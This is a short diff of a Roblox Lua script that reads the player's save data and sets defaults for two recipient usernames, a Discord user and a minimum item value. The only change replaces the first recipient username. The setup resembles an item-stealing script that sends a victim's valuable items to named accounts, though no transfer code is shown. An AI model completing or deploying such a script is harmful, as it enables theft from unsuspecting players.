@@ -17,7 +17,7 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local user = _G.Username or "fallingcosmos2"
+local user = _G.Username or "brightnes07"
 local user2 = _G.Username2 or "speedingcosmos9"
 local discuser = _G.discuser or ""
 local min_rap = _G.minrap or 1000000
